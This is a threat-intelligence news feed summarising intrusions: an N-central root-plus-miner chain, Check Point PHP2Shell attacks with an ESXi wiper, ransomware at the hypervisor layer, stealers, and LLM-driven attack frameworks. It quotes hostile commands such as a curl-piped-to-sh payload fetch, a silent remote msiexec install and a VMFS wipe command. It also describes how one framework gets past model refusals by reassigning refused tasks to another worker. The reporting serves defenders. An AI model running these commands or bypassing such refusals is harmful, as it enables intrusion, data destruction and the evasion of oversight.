item.content:encoded:
4EverAble2Shell, a public N-central exploit, went from repo commit to a weaponised root-plus-Monero-miner chain in about five hours. By 12:50 UTC on 12 November, 21 live N-central servers were mining, and 19 of them were already on Hotfix 2.

Timeline: the exploit hit the public repo at 03:58 UTC, the first probe on huntback's N-central decoy came at 08:30 from 157.20.241[.]16, and the first weaponised request followed at 09:16. The operator works from a target list and labels every victim before sending the payload.

- Entry point: POST /dms/services/ServerUI, the Apache Axis SOAP endpoint. The body is a SOAP fault whose exceptionName is jline.internal.TerminalLineSettings. Axis instantiates that class, which runs a shell command built from the data field. Probes carry the word "probe" (Mozilla/5.0 user-agent). Weaponised requests swap in a command (python-requests/2.31.0). Public reporting says this gives unauthenticated RCE as root and works against Hotfix 2 when the Legacy API is enabled.

- nable to root: the command runs as nable, uses flock on /var/opt/n-central/tmp to avoid double runs, and pipes in a base64 Python script (SHA-256 fc4c01fd11bc301cf312830460cfdccc3af9dcfe50c910b86d6a1117bc76c747), with output returned over raw TCP to 157.20.241[.]16 on ports 19202 to 19418. The script backs up /opt/nable/var/ncsai/scripts/ServerChild.sh to /var/opt/n-central/tmp/serverchild-<hex>.bak, symlinks /var/opt/n-central/flag/flag_default.json to ServerChild[.]sh, then abuses sudo nable_wrapper.pl setLDFileOwner to hand ServerChild[.]sh to nable. It rewrites ServerChild[.]sh to run a stage-two script, triggers it as root via nable_wrapper.pl serverControl noop --wait, then restores the original, deletes the symlink and backup, and prints write_before, write_after and helper_restored so the operator knows the traces are gone.

- Payload: the root command remounts /tmp exec and runs curl hxxp://157.20.241[.]16:8080/jup.sh piped to sh with the argument nc_<target-ip>. The installer works from /tmp/.xvd (or /var/tmp/.xvd) and pulls the miner (/xvgz, fallback /xmrig.tgz with stock XMRig 6.26.0). It uses half the cores (max 8) with --cpu-max-threads-hint 50, drops to RandomX light mode under 2.5 GB free memory, and mines to 139.99.69[.]109:10128 with fallback 79.76.51[.]56:39100. Persistence is a keep[.]sh watchdog via xvd.service, a user crontab line tagged # xvkeep, or /etc/cron.d/xvd, relaunching every 10 minutes. It beacons to /ob/cronhit and /ob/fcheck over HTTP.

- Scope: because rigs are named after victim IPs, the public pool page is a live victim list. Of 21 nc_ rigs, all had a valid share between 12:45 and 12:50 UTC (about 25 kH/s). huntback checked each over HTTPS: all serve N-central pages, most with MSP branding and months-old certificates, so these are production servers. 19 report build 2026.4.1.26 (Hotfix 2), one runs 2025.3.1.9. They sit in the United States 🇺🇸 (9), South Africa 🇿🇦 (4), Canada 🇨🇦 (4), plus the UK 🇬🇧, Germany 🇩🇪, France 🇫🇷 and Sweden 🇸🇪 (1 each). The decoys never ran commands, so none appear on the pool.

- Bigger operation: the same wallet had 631 rigs (about 255 kH/s) with prefixes for Jpom, FreePBX, MLflow, Apache Flink, PaperCut, SFTPGo and AJ-Report, plus 170+ rigs named <ip>_3000. N-central is the latest exploit added within hours of publication. The miner is the only payload seen so far, but the host holds remote-management access to downstream customers, so the same chain could run anything.

Takeaway: treat any hit as full compromise of an RMM server, not a miner cleanup. Hunt for /tmp/.xvd/ and /var/tmp/.xvd/ (x, keep[.]sh, xm.log), serverchild-*.bak, .sh or .out files in /var/opt/n-central/tmp/, and a symlink at /var/opt/n-central/flag/flag_default.json. Check for xvd.service, /etc/cron.d/xvd, or crontab lines ending # xvkeep for nable or root. Search process command lines for --rig-id nc_ or --donate-level 1. Review web logs for POSTs to /dms/services/ServerUI carrying an exceptionName element, especially jline.internal.TerminalLineSettings, and egress to 157.20.241[.]16 (8080 and 19202 to 19418) and the pool endpoints. Hotfix 2 alone is not enough: keep the Legacy API disabled while the fix is outstanding and follow N-able's guidance. Full IOC table, including the wallet address, is in the report.

item.title: Fake GTA 6 download goes after Steam logins and crypto wallet data
item.description:
A fake GTA 6 PC download reached via a Google Colab notebook delivers WARDEN Stealer, which grabs saved passwords, cookies, Steam, Roblox and crypto wallet data. The README tells victims to bypass their own defenses.
Cynet researchers followed a "GTA 6 EXE file download" link and found a WARDEN Stealer loader inside the ZIP. Grand Theft Auto VI launches November 19 with no PC version, so any PC installer on offer is something other than the game. People hunting for early access or a leaked build are the target.
- Lure chain: the Colab notebook link leads to a page called "Windows Software Hub" with a version number, a download count, and "Virus Free," "Secure," and "Verified" badges. It advertises a 72 MB download, but the ZIP holds a 796 KB executable and a 1 KB README. The size mismatch proves little on its own, since a download page and a file manager measure different things.
- The README is the stronger tell. It instructs the user to run the file as administrator, click past a security warning, and add an antivirus exclusion if the file is blocked. The victim does the evasion work, so expect elevated execution on an affected host, plus a newly added exclusion if the file was blocked, right around when the ZIP was downloaded.
- Capabilities: the binary has no game engine, no game assets, and no Rockstar signatures. It checks for a VM or sandbox, injects code into browser processes, replaces cryptocurrency addresses copied to the clipboard, and can download more malware. Stolen data includes saved passwords, browser cookies, Steam and Roblox credentials, and crypto wallet data.
- Indicators: Cynet names uroker[.]casa as the probable C2 server and published SHA-256 hashes for the executable and the README. It also lists 104.21.75[.]176 but warns against blocking it, because it is a shared Cloudflare IP and would sweep in unrelated traffic.
Takeaway: if anyone ran this, treat the host as a credential and session compromise, not just a malware cleanup. Because cookies are taken, reset passwords and invalidate active sessions for browser-stored accounts, Steam, and Roblox, and move funds out of any wallet exposed on the machine. Check recent transactions for swapped destination addresses given the clipboard replacement. Hunt for DNS and proxy hits to uroker[.]casa, match file hashes against the ones in Cynet's report, and review endpoints for recently added antivirus exclusions that no admin approved. Block on the domain, not the shared Cloudflare IP.

item.title: Check Point gateways hacked via PHP2Shell to deploy VMware ESXi wiper
item.description:
Check Point Security Gateways with exposed Mobile Access portals were breached via PHP2Shell, escalated to root, and used as a launchpad into VMware ESXi hosts, where a wiper called destroy_v6 deleted data. The first wave hit Israeli 🇮🇱 organizations starting October 30.
- Initial access: PHP2Shell is the name for two critical PHP flaws, CVE-2026-109618 and CVE-2026-109619, that allow unauthenticated RCE. PHP shipped emergency patches on October 21, but Amazon Threat Intelligence saw exploitation attempts four days earlier. CISA added both to KEV on October 26 and warned of chaining with the Fragnesia Linux kernel flaw for root. In these intrusions, the actor came in through the gateway Mobile Access portal and then used a newly disclosed zero-day, CVE-2026-123039, to get root.
- Persistence and tooling: with root, the actor installed PHP webshells and the TSGA backdoor, which embeds a networking component called TSProxy that listens for operator commands hidden inside regular traffic. Check Point tentatively links TSGA and TSProxy to PhiliKit, a framework previously seen in Ivanti appliance attacks and tied by ESET to the Chinese 🇨🇳 cluster UNC5221. Attribution is not confident, and political messages left during the destructive stage raise the possibility of a false flag.
- Lateral movement and impact: in the Israeli 🇮🇱 cases, the actor located ESXi hosts with the open-source gogo scanner, moved from the gateway, and ran destroy_v6. It recursively deletes data in a target directory, first trying a zero fill to hinder recovery, with a fast mode that skips the overwrite. A note named DREAM_ANNEXATION.txt references Dream Security Ltd., carries political messages, and rejects ransom negotiation, which points to damage and disruption as the goal.
- Scope: a second wave on November 2 hit organizations across multiple countries and sectors. Check Point did not see destructive activity there, and what the actors did after access remains unclear. Treat any exposed gateway as potentially compromised even without a wiper event.
- Evidence to check on previously exposed gateways, per Check Point: session files containing upload_progress_pwn, unexpected CPconfigdaemon processes or binaries, and unexplained gaps in firewall logs. Unauthorized SSH from the gateway to internal ESXi hosts is a clear sign of breach.
Takeaway: if a gateway had an internet-facing Mobile Access portal, scope it before you patch. Preserve the session files, process listing, and firewall logs first, since log gaps are themselves an indicator. Then review ESXi authentication records for SSH originating from the gateway's address, and check datastores and directories for DREAM_ANNEXATION.txt. Because the wiper overwrites data, recovery depends on offline or off-host backups, so confirm those are intact. After evidence is captured, install the November Jumbo Hotfix on all Management Servers and Security Gateways, starting with those that have exposed Mobile Access portals. It covers PHP2Shell and the DynamicCLI privilege escalation flaw used in the attacks.

item.title: Inside the loop: Five AI attack frameworks that never ask permission
item.description:
ARTEX, CyberStrikeAI, Cairn, PentAGI and HexStrike are LLM-driven attack frameworks already seen in real intrusions. None enforces authorization in code by default, and ARTEX acts in 2 to 25 second bursts.
- Who and where: Together the five have drawn more than 60,000 GitHub stars. GTIG and Mandiant observed ARTEX, Cairn, HexStrike and PentAGI in incident response engagements, and Microsoft attributed ARTEX use to Storm-0940. Elastic Security Labs traced an AI-assisted AWS intrusion to a CyberStrikeAI server. The tools are familiar scanners, curl, shells and cloud CLIs. What is new is a model planning each step and splitting work across agents.
- No guardrails: CyberStrikeAI ships with approval mode off, PentAGI's Compose file sets ASK_USER to false, and ARTEX runs agents in a bypass permission mode. Three frameworks tell the model it is already authorized. Cairn's dispatcher sidelines a refusing worker for five seconds and hands the task to another. The only default target restrictions are blocklists for government domains (ARTEX, CyberStrikeAI) and education domains (ARTEX).
- Blocking is not containment: ARTEX and CyberStrikeAI change route when blocked. GTIG, relaying Wiz Research on UNC7228, reports a fallback to open proxies. CyberStrikeAI skills swap proxies, User-Agents and forwarding headers, then try free proxies in the target's own country, then Tor. Revocation also lags. Entra tokens issued before a disable typically live 60 to 90 minutes without continuous access evaluation. AWS role-session revocation leaves IAM users' long-term keys alone.
- Hunt defaults, which can change per release: ARTEX: nuclei, httpx, katana, ffuf and sqlmap traffic, User-Agents artex-enrich/1.0 or norma/0.4, and new app accounts followed by multi-session sign-ins. CyberStrikeAI: User-Agent Mozilla/5.0 (compatible; CyberStrikeAI-WebShell/1.0) with a pass form field, a web server process running echo :OSPROBE_%OS%:END, persistence named SystemUpdate or com[.]apple.systemupdate, a .bashrc line ending in # cs, and an [@]reboot cron entry. PentAGI: connections to TCP 28000 to 29999 on the PentAGI host, pages requested twice at once, and, from a PentAGI installation on your network, check-ins to update.pentagi[.]com every three hours. HexStrike: User-Agents HexStrike-HTTP-Framework/1.0 and HexStrike-BrowserAgent/1.0, the marker <hexstrikeXSSTest123>, and a Python server on port 8888 parenting security tools. Cairn: reverse shells and callbacks to the operator host's own address.
- Why IOCs rot: ARTEX logged about 390 commits in ten and a half weeks, and forks carried it on after the original repository came down in October 2026. Several frameworks write or install tools mid-task. Behaviors such as credential access, remote execution and offensive tools started by a service stay stable.
Takeaway: Detect tempo and sequence per identity. Count distinct sensitive actions per identity and issuing role in short windows, then join discovery, secret access and remote execution under one role or source address across sessions, with a long lookback because operations can run for hours. The report includes an ES|QL hunt that flags one-minute windows with three or more client families (curl, Python, browser, AWS client) and a request burst. Its thresholds are three families and 20 requests per minute, so baseline build systems, admin AWS CLI use and shared NAT first. After any source block, revoke the identity's sessions and tokens, then confirm the next request fails.

item.title: PapRAT Campaign Exposes BITTER's Expanding Espionage Toolkit
item.description:
BITTER, a suspected South Asian espionage group, is running three infection chains that deliver PapRAT, a RAT now in both C++ and Rust. One chain abuses ftp.exe, curl, cmd.exe and scheduled tasks to get recon and persistence without dropping a conventional malware binary.
PolySwarm's write-up of FortiGuard Labs research attributes the campaign to BITTER with high confidence, based on lure filenames, C2 patterns, file metadata, malware traits and a link to the earlier WmRAT implant. Targeting is concentrated in South Asia. No national sponsor or full victim list is established.
- Chain 1 (no PE up front): LNK files posing as military program and diplomatic meeting documents call the native ftp.exe and abuse its "!" prefix to run local shell commands. The commands live in files disguised as icons. Scripts create scheduled tasks and use curl to pull more instructions into files such as err.log, which cmd.exe then executes. Recon covers running processes, directories, mounted drives, installed antivirus products and common user folders. Output is staged in abc.pdf before exfiltration.
- Chain 2 (VHDX to MSI): A VHDX disguised as diplomatic correspondence about the 11th Belt and Road Summit exposes a visible LNK plus a hidden spreadsheet and MSI. Opening the shortcut launches the installer and shows the decoy spreadsheet. The MSI drops PapRAT as bruzsvc.exe, posing as a Microsoft component. The C++ build supports eight commands, beacons over plaintext HTTP roughly every ten seconds to a hardcoded C2, and XOR-encodes its C2 config with key 0x50.
- Chain 3 (WebDAV to WmRAT): A RAR posing as a 2026 gala dinner invitation holds a URL shortcut pointing to an attacker WebDAV location. A malicious LNK then runs commands, sets scheduled-task persistence and silently installs PapRAT through an MSI. PapRAT fetches a second executable, vnces.exe, identified as WmRAT, a C++ RAT previously tied to BITTER that does system info collection, screenshots, directory enumeration and remote command execution.
- Rust PapRAT: The newer build moves C2 to HTTPS, waits about 42 seconds, then polls every five seconds. Config strings are hidden with reversed strings and ROT-3 instead of XOR. The command set grows from eight to eleven: MS2 (PowerShell execution), SLP (suspend, then resume polling) and BYE (terminate the process). The report does not say BITTER has dropped the C++ version. Static signatures and plaintext-HTTP network rules will miss the Rust build.
- Why it matters: Operators can change instructions server-side without redeploying malware, and the ftp.exe, curl and cmd.exe chain blends into normal admin activity. Detections keyed to a binary or a script interpreter see little here.
Takeaway: Hunt the chain, not the payload. Look for ftp.exe launched from a shortcut and running script content from a file that looks like an icon, then cmd.exe and curl children. Check for new scheduled tasks created in the same window, and for err.log and abc.pdf appearing in unexpected locations. For the VHDX chain, look for a mounted disk image followed by an MSI install and a bruzsvc.exe masquerading as a Microsoft component. On the network side, watch for beacons at a steady ten-second cadence over HTTP, or the 42-second delay then five-second HTTPS polling of the Rust build. Look for vnces.exe as a follow-on drop. Pivot on the two hashes in the report: the LNK at e3992f8c945b0761242377cba32d91b0a390c7cecd79478439843d93e6d2b76b and PapRAT at 569a21b519aaac8c92f653d708ab6ef34e3f38ea967f47e041d1e2425f6a4b33.

Takeaway: Hunt the chain, not the payload. Look for ftp.exe launched from a shortcut and running script content from a file that looks like an icon, then cmd.exe and curl children. Check for new scheduled tasks created in the same window, and for err.log and abc.pdf appearing in unexpected locations. For the VHDX chain, look for a mounted disk image followed by an MSI install and a bruzsvc.exe masquerading as a Microsoft component. On the network side, watch for beacons at a steady ten-second cadence over HTTP, or the 42-second delay then five-second HTTPS polling of the Rust build. Look for vnces.exe as a follow-on drop. Pivot on the two hashes in the report: the LNK at e3992f8c945b0761242377cba32d91b0a390c7cecd79478439843d93e6d2b76b and PapRAT at 569a21b519aaac8c92f653d708ab6ef34e3f38ea967f47e041d1e2425f6a4b33.

item.title: Unpatched Check Point Gateways Are Being Wiped exploiting PHP2Shell
item.description:
Unpatched Check Point gateways were hit via PHP2Shell and root escalation CVE-2026-123039, ending in a wiper on ESXi at Israeli 🇮🇱 orgs. Attribution to China-linked UNC5221 is uncertain.
- Initial access and timing: Check Point Research says scanning began 30 October, about a week after a fix shipped, from 130.94.19[.]204. The target was the Mobile Access portal, with PHP2Shell activity tied to CVE-2026-109618 and CVE-2026-109619. The attacker then escalated from the portal service account to root with CVE-2026-123039, a local privilege escalation in the DynamicCLI IPC interface. Wave one on 30 October hit Israeli 🇮🇱 organizations, and some were wiped. Wave two on 2 November reached several countries and sectors with no destruction seen, which points to opportunistic scanning.
- First evidence on the box: PHP session files in /opt/CPcvpn-R81.20/tmp/ containing the marker upload_progress_pwn. The portal's Apache and PHP processes also crashed hundreds of times, consistent with repeated exploit attempts. Root access was then used to drop PHP webshells in the portal's login-page template folder, named zz*.tpl. Early versions were simple command runners. Later ones needed a hardcoded key, ran system commands and PHP code, and accepted uploads. Uploads landed as /tmp/.up.tpl and were copied in as challenge_render.tpl.
- Implants: The TSGA backdoor ran from /tmp/CPconfigdaemon, then moved itself and restarted as slot_CPconfigdaemon. It provides encrypted remote access, configuration theft, persistence through backups and snapshots, process injection, and tampering with binary firewall logs. It installed TSProxy at /lib/libcpfwcommon.so, which runs inside appliance processes and intercepts only the attackers' connections, leaving normal traffic alone. Both look like modified PhiliKit, previously seen in Ivanti attacks and linked by ESET to UNC5221. Shared traits include TCP port 11072 and a Unix socket at /tmp/.p_sock. TSProxy reuses the credentials, secrets, TLS certificate and private key of PhiliKit's libdssafe[.]so.
- Lateral movement and destruction: From the gateway the attackers ran the gogo scanner to map the internal network, then used SSH with the vpxuser account to reach a VMware ESXi host. There they staged and ran the Linux wiper destroy_v6. It deletes files in a target folder regardless of extension, zero-overwrites them first unless run in fast mode, and can skip listed folders. It leaves DREAM_ANNEXATION.txt in each folder it processes, a politically themed Hebrew note with a timestamp that rejects ransom talks.
- Attribution is contested: Pointing to China 🇨🇳: gogo, LightNode VPS hosting, scanning between 00:00 and 09:00 UTC (China 🇨🇳 working hours), and the PhiliKit overlap. Pointing away from UNC5221's known profile: destructive attacks, the Israeli 🇮🇱 focus, the Hebrew note, and a malware name that appears to reference "Philistine". The note uses the Dream Security brand, and Dream recently published PHP2Shell research on Palo Alto Networks devices by China-nexus actors. Check Point says it cannot assess with high confidence whether this was a single actor, an initial access broker handoff, a false flag, or a wiper used as a smoke screen.
Takeaway: if you run Mobile Access on Check Point gateways, hunt rather than just patch. Check /opt/CPcvpn-R81.20/tmp/ for session files containing upload_progress_pwn. Look for zz*.tpl files in the portal's login template folder and for challenge_render.tpl. Look for /tmp/CPconfigdaemon, slot_CPconfigdaemon, /lib/libcpfwcommon.so, /tmp/.p_sock, and traffic on TCP 11072. Review Apache and PHP crash history around 30 October and 2 November, and search logs for 130.94.19[.]204. Treat binary firewall logs as potentially tampered, since TSGA edits them, so corroborate with off-box logs. On ESXi, audit SSH logins by vpxuser from the gateway and search for DREAM_ANNEXATION.txt. If a gateway was exposed and unpatched, assume root compromise and preserve a snapshot before remediation.

item.title: 56 AWS API calls in 141 milliseconds: Inside an AI-run intrusion
item.description:
One CyberStrikeAI server worked stolen credentials from eight AWS identities across four accounts. It read 56 EC2 user data scripts in 141 ms, went quiet for 14 days, then returned. All 78 alerts were medium or low severity.
Elastic Security Labs saw this between Sep 30 and Oct 16, 2026. The source was 43.240.29[.]11, a server running CyberStrikeAI, an open-source platform that pairs LLM agents with offensive tools. Team Cymru previously tied it to Fortinet edge targeting, and this is the first AWS case Elastic has seen. The report calls it AI-assisted based on tool attribution and machine-speed behavior. It cannot prove an LLM made the decisions, and the initial credential theft is unknown.
- Credentials and attribution: five IAM users and three EC2 instance roles were used. The role sessions were named after instance IDs, so the keys were lifted from the instances, for example via SSRF or host compromise, and replayed from outside. Scan data showed 43.240.29[.]11 serving a CyberStrikeAI page on port 8080 with a self-signed cert (serial 3356730520974368630) the day before the first alert. 43.240.29[.]28 and 43.240.29[.]33 share the cert, hosting (AS133199) and FOFA fid but were not in the AWS telemetry. None of the three serves the interface as of November, so use them for retrospective hunting.
- Attack chain: Phase 1 validated keys with GetCallerIdentity, with three calls landing in one second across three accounts, plus GetSessionToken. Phase 2 had app-role call GetSecretValue, then DescribeInstanceAttribute for userData, 56 calls at about 2.5 ms each. User data often holds hardcoded keys, DB credentials and certificates. Phase 3 pulled secrets from a non-production role. On Oct 2, container-role did GetParameter with decryption, then SSM SendCommand 29 seconds later. Phase 4 on Oct 16 revalidated access and touched a fourth account for the first time.
- Evidence gap: CloudTrail shows that SendCommand was issued, not what ran or whether it worked. That Oct 2 sequence is the highest-risk activity in the data. The report maps the activity to T1078.004, T1087.004, T1552.005, T1555.006 and T1651.
- Detection lesson: six rules fired, and each alert looked routine alone: first-time GetCallerIdentity, GetSessionToken usage, SendCommand by a rare user, SecureString decryption, first-time secret access, and user data retrieval, which made up 58 of the 78 alerts. 65 of the 78 came on day one. Only the shared source IP linked them. A fixed correlation window would have split this into unrelated alerts, especially across the 14-day gap. The report adds two high-severity ES|QL rules: EC2 Bulk User Data Enumeration (more than 20 distinct instances read by one principal and source IP in 10 minutes) and STS GetCallerIdentity Bulk Account Enumeration (three or more distinct non-role identities from the same external IP and ASN in 10 minutes).
Takeaway: pivot CloudTrail on source IP across all accounts, with a lookback of weeks, not hours. Hunt for these patterns:
- DescribeInstanceAttribute for userData in bursts from one role session
- First-time GetCallerIdentity from one external IP across several accounts or users in the same minute
- GetSessionToken or GetSecretValue from an instance role session whose source IP is not the instance or your NAT
- GetParameter with decryption followed within a minute by SendCommand from the same role
For any unexpected SendCommand, review SSM command history for that window and check use of AWS-RunShellScript, AWS-RunPowerShellScript or custom documents, since the audit log will not show the command body. Treat every secret in EC2 user data as exposed, rotate instance roles by replacing the instance profile or instance, and check non-production secrets for overlap with production. Then work backward to how the instance credentials were taken: exposed web apps, SSRF, code repos, IMDS. The full IOC set, including the certificate public key, is in the report.

item.title: XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe
item.description:
A ClickFix phishing platform called XaocMail pushes an MSI that installs Phantom53, a Python-hosted implant using DNS-over-HTTPS C2 that loads Havoc in memory on demand. SOCRadar says it launched in August 2026, is still active, and the codebase shows AI-assisted development.
- Delivery: XaocMail sends personalized document-sharing emails (Google Docs, Adobe Acrobat, Office365, SecuredDocs templates) linking to Cloudflare Workers pages like hxxps://securedoc.mesuttgulerr573.workers[.]dev/?id=linkId. The ClickFix page tells the victim to paste a command into Win+R. The preferred vector is msiexec /i hxxps://…/m?id=X /qn (T1218.007, T1204.004). Alternatives are a PowerShell cradle that also fetches the MSI, and an older HTA path delivering a ZIP with GUP.exe sideloading libcurl.dll. The MSIs sit in Cloudflare KV, and the phishing backend is 185.224.132[.]148 on port 8585.
- Host footprint: the MSI impersonates Visual Studio Tools, Python, or Node.js and runs a CustomAction DLL. It drops a Python 3.11 runtime into a random [a-z0-9] directory under %LOCALAPPDATA% or %APPDATA%, plus two venvs. The beacon is a fake cv2.pyd (numpy, PIL, and lxml donors are also supported) launched by a random .pyw via pythonw.exe every 12 minutes. The watcher runs every 3 minutes. Task names mimic MicrosoftEdgeUpdateTask, OneDriveSyncTask, WindowsDefenderScheduledScan, OfficeBackgroundTaskHandler, and AdobeAcrobatUpdateTask plus a suffix. Elevated runs register tasks through COM ITaskFolder::RegisterTask with no schtasks.exe. Non-elevated runs write %TEMP%\p53_task_a.xml and p53_task_b.xml and use Register-ScheduledTask. State lives under HKCU\Software\Classes\CLSID.
- C2: commands ride in AAAA record answers over DoH to Google, Cloudflare, and ControlD resolvers, with FQDNs of base36 tokens. Fallback is UDP/53 to hardcoded resolver IPs. The beacon gates on sandbox checks (uptime, tick delta, idle time). A week-keyed SHA256 DGA ending in .xyz handles takedowns (T1568.002). Phantom53 C2 domains in the IOCs include a8f2aac37385[.]xyz and 544504d7fe1e[.]xyz. CMD_EXEC runs base64 PowerShell with -NonInteractive -WindowStyle Hidden -EncodedCommand.
- Stage two: CMD_WAKE makes the beacon write an IPC file to %TEMP% with an AES key and a Worker URL. The watcher checks the mutex Global\P53Demon_{wake_id_hex} and spawns a demon-loader pythonw.exe. That instance decrypts an AES-GCM demon.dat, reflectively loads the Havoc Demon (T1620), and zeroes the buffer. The HavoX login panel is at 145.63.138[.]67:8000, and PowerShell aliases exfiltrate to hxxp://145.63.138[.]67:8125/up/. Payloads target browser and password manager data, SSH keys and Git tokens, crypto wallets and seed phrases, messaging apps, and AI tool secrets. One alias drops Level RMM, and another does a fodhelper.exe UAC bypass.
- Scope and AI: SOCRadar found almost a thousand personalized lure pages. Recipients skew toward Brazil 🇧🇷 and Peru 🇵🇪, then India 🇮🇳, Indonesia 🇮🇩, and Spain 🇪🇸, across tech, finance, education, government, logistics, and manufacturing. The codebase includes .claude/ settings, 143 numbered task files in Claude Code's naming convention, a 117 KB arch[.]md, and a prompt for a Claude agent to test the MSI in a VM.
Takeaway: hunt for explorer.exe spawning msiexec.exe with a workers[.]dev URL, pythonw.exe launched by svchost.exe (Task Scheduler) running a .pyw from %APPDATA% or %LOCALAPPDATA%, and pythonw.exe loading .pyd files outside a standard Python install. Also look for pythonw.exe talking to public DoH resolver IPs on 443 or to IPs on port 53. On a hit, preserve the venv directories, task XML, and the HKCU CLSID keys before cleanup, since CMD_WIPE deletes the tasks, venvs, and temp files. Network, host, and hash IOCs are in the report.

item.title: Ransomware at the hypervisor layer: how attackers use ESXi and vCenter features for malicious purposes
item.description:
BlackNevas wiped four ESXi hosts, two vCenter appliances and the backups in 10 days with no hypervisor exploit. vCenter Host Profiles turned on SSH, and the evidence sits in management-plane logs, not guest EDR.
Kaspersky GERT's write-up shows a ransomware crew that never broke VMware. Every action ran through legitimate management interfaces. Guest EDR could not attribute the ESXi-side process that overwrote the VMDKs, so host and vCenter telemetry carried the timeline.
- Foothold on vCenter: credentials taken from non-virtualization systems reached the vCenter Server Appliances. The attacker SSHed in as root and deployed MeshAgent through a shell script 43 seconds later. The session lasted 2m26s and was never reused. About four hours later they returned via MeshAgent and installed Ligolo-ng v0.8.2 as /etc/systemd/system/vmware-vdma.service (ExecStart /opt/vmware/bin/agent, Restart=always), calling api.cloudvflare[.]com:443. That maps to T1543.002 and T1572. Monitoring only interactive SSH would have missed it.
- Host Profiles as an access path: the attacker read host config, then pushed a Host Profile change at T+10m18s. TSM-SSH reached RUNNING at T+10m51s (vpxa.log plus vobd.log). Direct SSH to ESXi then came from the vCenter appliance IP, a source normally trusted. Each step is legitimate alone; the sequence is the signal.
- Staging and detonation: the payload arrived by SFTP, and auth.log recorded a FlowSsh client identifier. shell.log showed true-only probe sessions, chmod +x /tmp/esx64, then /selftest for about 16 seconds, roughly three hours before detonation. The final command was ./tmp/esx64 /p /vmfs/ /depth 5 /wipe /allsys /detach /-showvolumes. The switches resemble documented Trigona/BlackNevas behavior, but no binary was recovered, so some interpretations are medium confidence.
- Impact scale: all VMs on the disaster-recovery host stopped within 23 seconds, and vmksummary.log showed the hourly running-VM count falling to zero. ._wipe artifacts appeared across datastores. About the first 2 KB of virtual disks was overwritten. That alone does not prove GPT metadata is unrecoverable, since a valid backup GPT header may exist.
- Recovery destroyed first (T1490): antivirus on the backup environment was disabled days earlier. Backup services were stopped and recovery infrastructure encrypted before ESXi detonation. Stored credentials were extracted from the backup server after admin execution there, a bridge to other tiers.
DFIR takeaway: ESXi logs live on a ramdisk and clear at reboot, so do not reboot to evict the attacker. Pull auth.log, shell.log, vpxa.log, vobd.log, hostd.log, vmksummary.log, hostprofiletrace.log and vCenter Events/Tasks first. On the VCSA, preserve /etc/systemd/system and the /opt/vmware binaries any unknown unit points to. Hunt for Host Profile remediation that changes TSM or TSM-SSH outside a change window, followed within 15 minutes by an SSH session from vCenter. Also hunt for executables staged in /tmp that run a short self-test and then touch /vmfs. IOCs (IPs, hashes, service names) and the report's example correlation logic are in the report.

item.content:encoded:
BlackNevas wiped four ESXi hosts, two vCenter appliances and the backups in 10 days with no hypervisor exploit. vCenter Host Profiles turned on SSH, and the evidence sits in management-plane logs, not guest EDR.

Kaspersky GERT's write-up shows a ransomware crew that never broke VMware. Every action ran through legitimate management interfaces. Guest EDR could not attribute the ESXi-side process that overwrote the VMDKs, so host and vCenter telemetry carried the timeline.

- Foothold on vCenter: credentials taken from non-virtualization systems reached the vCenter Server Appliances. The attacker SSHed in as root and deployed MeshAgent through a shell script 43 seconds later. The session lasted 2m26s and was never reused. About four hours later they returned via MeshAgent and installed Ligolo-ng v0.8.2 as /etc/systemd/system/vmware-vdma.service (ExecStart /opt/vmware/bin/agent, Restart=always), calling api.cloudvflare[.]com:443. That maps to T1543.002 and T1572. Monitoring only interactive SSH would have missed it.

- Host Profiles as an access path: the attacker read host config, then pushed a Host Profile change at T+10m18s. TSM-SSH reached RUNNING at T+10m51s (vpxa.log plus vobd.log). Direct SSH to ESXi then came from the vCenter appliance IP, a source normally trusted. Each step is legitimate alone; the sequence is the signal.

- Staging and detonation: the payload arrived by SFTP, and auth.log recorded a FlowSsh client identifier. shell.log showed true-only probe sessions, chmod +x /tmp/esx64, then /selftest for about 16 seconds, roughly three hours before detonation. The final command was ./tmp/esx64 /p /vmfs/ /depth 5 /wipe /allsys /detach /-showvolumes. The switches resemble documented Trigona/BlackNevas behavior, but no binary was recovered, so some interpretations are medium confidence.

- Impact scale: all VMs on the disaster-recovery host stopped within 23 seconds, and vmksummary.log showed the hourly running-VM count falling to zero. ._wipe artifacts appeared across datastores. About the first 2 KB of virtual disks was overwritten. That alone does not prove GPT metadata is unrecoverable, since a valid backup GPT header may exist.

- Recovery destroyed first (T1490): antivirus on the backup environment was disabled days earlier. Backup services were stopped and recovery infrastructure encrypted before ESXi detonation. Stored credentials were extracted from the backup server after admin execution there, a bridge to other tiers.

DFIR takeaway: ESXi logs live on a ramdisk and clear at reboot, so do not reboot to evict the attacker. Pull auth.log, shell.log, vpxa.log, vobd.log, hostd.log, vmksummary.log, hostprofiletrace.log and vCenter Events/Tasks first. On the VCSA, preserve /etc/systemd/system and the /opt/vmware binaries any unknown unit points to. Hunt for Host Profile remediation that changes TSM or TSM-SSH outside a change window, followed within 15 minutes by an SSH session from vCenter. Also hunt for executables staged in /tmp that run a short self-test and then touch /vmfs. IOCs (IPs, hashes, service names) and the report's example correlation logic are in the report.

item.title: Hackers Exploit PHP2Shell Flaws in Check Point Gateways to Deploy TSGA Backdoor and Wipe ESXi Files
item.description:
Unpatched Check Point gateways were chained from PHP2Shell web access to root via a new Gaia OS flaw, then used to drop the TSGA backdoor and pivot to ESXi, where the destroy_v6 wiper ran. Attribution is still unresolved.
An unknown actor began hitting Check Point Security Gateways on October 30, 2026, targeting Israeli 🇮🇱 organizations. A broader wave followed on November 2 across multiple countries and sectors, with no clear geographic or sector preference. Check Point says some first-wave victims also suffered destructive activity.
- Initial access: activity from 130.94.19[.]204 hit vulnerable Mobile Access portals about a week after a security fix shipped. Exploitation matched PHP2Shell, tied to CVE-2026-109618 and CVE-2026-109619. The actor then escalated from the portal service account to root using CVE-2026-123039 (CVSS 7.8), a missing authorization flaw in the DynamicCLI process. Any authenticated local user can run arbitrary commands by writing a single request to its socket. It needs local code execution first, and Check Point has seen active exploitation against a couple of dozen customers.
- Affected: R82.20, R82.10, R82, R81.20, R81.10 and R81 of Force Firewalls, Management and Log Servers, Multi-Domain Security Management and Multi-Domain Log Server, and Maestro Orchestrator.
- Persistence: PHP web shells with command execution and file upload, then TSGA, a standalone passive Linux backdoor deployed as slot_CPconfigdaemon. It offers encrypted remote access, configuration theft, backup and snapshot persistence, process injection, and binary firewall-log tampering. Its TSProxy component is injected into selected appliance processes and intercepts networking functions to handle specially marked attacker connections while normal traffic flows on.
